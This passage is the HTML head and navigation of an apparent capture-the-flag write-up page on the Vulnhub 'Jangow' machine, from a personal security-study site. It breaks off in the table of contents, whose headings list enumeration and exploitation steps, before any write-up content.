<!DOC
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
        <link rel="canonical" href="http://itsec.aria-network.com/ctf-boxes/vulnhub/easy/jangow/jangow/">
      
      
        <link rel="prev" href="../../../../htb/easy/nibbles/nibbles/">
      
      
        <link rel="next" href="../../../../thm/easy/easypeasy/easypeasy/">
      
      
      <link rel="icon" href="../../../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.5.2, mkdocs-material-9.3.1">
    
    
      
        <title>Jangow - ITSec</title>
      
    
    
      <link rel="stylesheet" href="../../../../../assets/stylesheets/main.046329b4.min.css">
      
        
        <link rel="stylesheet" href="../../../../../assets/stylesheets/palette.85d0ee34.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../../../../stylesheets/extra.css">
    
    <script>__md_scope=new URL("../../../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    
      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#abstract" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../../../.." title="ITSec" class="md-header__button md-logo" aria-label="ITSec" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            ITSec
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Jangow
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="blue-grey" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
      </label>
    
  
</form>
      
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
    
      
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
    <li class="md-tabs__item">
      <a href="../../../../.." class="md-tabs__link">
        
  
    
  
  Home

      </a>
    </li>
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../../htb-academy/pentesting_basics/" class="md-tabs__link">
          
  
  HTB Academy

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      
  
  
  
    
    
      
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../../overthewire/bandit/level0/" class="md-tabs__link">
          
  
  overthewire.org

        </a>
      </li>
    
  

    
  

    
  

      
        
  
  
    
  
  
    
    
      
  
  
    
  
  
    
    
      
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../../../../htb/easy/nibbles/nibbles/" class="md-tabs__link">
          
  
  CTF

        </a>
      </li>
    
  

    
  

    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../../tools/tmux/" class="md-tabs__link">
          
  
  Tools

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../../cheatsheets/cheatsheet_basic_linux_tools/" class="md-tabs__link">
          
  
  Cheatsheets

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
    
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../../../.." title="ITSec" class="md-nav__button md-logo" aria-label="ITSec" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    ITSec
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
    <li class="md-nav__item">
      <a href="../../../../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Home
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    HTB Academy
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            HTB Academy
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../htb-academy/pentesting_basics/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Pentesting Basics
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../htb-academy/web_requests/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Web Requests
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../htb-academy/javascript_deobfuscation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Javascript Deobfuscation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../htb-academy/network_enumeration_with_nmap/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Network Enumeration with Nmap
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../thm/template/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Template
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    overthewire.org
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            overthewire.org
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    
    
    
      
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
        
          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Bandit
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_1">
            <span class="md-nav__icon md-icon"></span>
            Bandit
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_1" >
        
          <label class="md-nav__link" for="__nav_3_1_1" id="__nav_3_1_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Level 0-10
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_1_1">
            <span class="md-nav__icon md-icon"></span>
            Level 0-10
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level0/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 0
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level0-1/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 0-1
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level1-2/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 1-2
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level2-3/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 2-3
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level3-4/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 3-4
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level4-5/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 4-5
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level5-6/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 5-6
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level6-7/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 6-7
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level7-8/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 7-8
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level8-9/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 8-9
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level9-10/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 9-10
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_2" >
        
          <label class="md-nav__link" for="__nav_3_1_2" id="__nav_3_1_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Level 11-20
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_1_2">
            <span class="md-nav__icon md-icon"></span>
            Level 11-20
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level10-11/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 10-11
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level11-12/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 11-12
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level12-13/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 12-13
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level13-14/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 13-14
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level14-15/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 14-15
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level15-16/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 15-16
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level16-17/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 16-17
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level17-18.md" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 17-18
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level18-19.md" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 18-19
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level19-20.md" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 19-20
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_3" >
        
          <label class="md-nav__link" for="__nav_3_1_3" id="__nav_3_1_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Level 21-30
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_1_3">
            <span class="md-nav__icon md-icon"></span>
            Level 21-30
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level20-21.md" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 20-21
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level21-22.md" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 21-22
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level22-23.md" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 22-23
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level23-24.md" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 23-24
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level24-25.md" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 24-25
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level25-26.md" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 25-26
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level26-27.md" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 26-27
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level27-28.md" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 27-28
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level28-29.md" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 28-29
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level29-30.md" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 29-30
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_4" >
        
          <label class="md-nav__link" for="__nav_3_1_4" id="__nav_3_1_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Level 31-33
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_1_4">
            <span class="md-nav__icon md-icon"></span>
            Level 31-33
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level30-31.md" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 30-31
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level31-32.md" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 31-32
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/bandit/level32-33.md" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 32-33
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
    
    
    
      
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
        
          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Natas
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_2">
            <span class="md-nav__icon md-icon"></span>
            Natas
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../../overthewire/natas/levoel1-2.md" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Level 1-2
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
        
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    CTF
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            CTF
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    
    
    
      
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_1" >
        
          <label class="md-nav__link" for="__nav_4_1" id="__nav_4_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    HTB
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4_1">
            <span class="md-nav__icon md-icon"></span>
            HTB
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_1_1" >
        
          <label class="md-nav__link" for="__nav_4_1_1" id="__nav_4_1_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Easy
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_1_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4_1_1">
            <span class="md-nav__icon md-icon"></span>
            Easy
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    <li class="md-nav__item">
      <a href="../../../../htb/easy/nibbles/nibbles/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Nibbles
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
    
  
  
    
    
    
      
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" checked>
        
          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Vulnhub
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_4_2">
            <span class="md-nav__icon md-icon"></span>
            Vulnhub
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_1" checked>
        
          <label class="md-nav__link" for="__nav_4_2_1" id="__nav_4_2_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Easy
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_1_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_4_2_1">
            <span class="md-nav__icon md-icon"></span>
            Easy
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    Jangow
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    Jangow
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#abstract" class="md-nav__link">
    Abstract
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enumeration" class="md-nav__link">
    Enumeration
  </a>
  
    <nav class="md-nav" aria-label="Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#nmap" class="md-nav__link">
    nmap
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web-footprinting" class="md-nav__link">
    Web Footprinting
  </a>
  
    <nav class="md-nav" aria-label="Web Footprinting">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#directory" class="md-nav__link">
    Directory
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#website" class="md-nav__link">
    Website
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#exploitation-research" class="md-nav__link">
    Exploitation Research
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#exploitation" class="md-nav__link">
    Exploitation
  </a>
  
    <nav class="md-nav" aria-label="Exploitation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exploit" class="md-nav__link">
    Exploit
  </a>
  
</li>
        
          <li class="md-nav__item">
